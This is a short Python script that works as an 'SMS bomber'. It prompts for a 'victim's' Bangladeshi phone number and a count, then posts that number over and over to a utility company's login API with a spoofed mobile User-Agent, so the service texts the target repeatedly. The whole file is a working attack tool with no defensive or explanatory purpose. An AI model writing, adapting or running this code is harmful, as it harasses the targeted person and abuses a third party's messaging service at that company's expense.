import requests
number = str(input("Please inter victim's number:+88"))
amount = int(input("Enter amount: "))
api = 'http://nesco.sslwireless.com/api/v1/login'
headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36'}
data = {'phone_number':number}
for i in range(amount):
    a =requests.post(api,headers=headers,json=data)
    print(str(i+1)+"sms sent by Mojib Rsm")
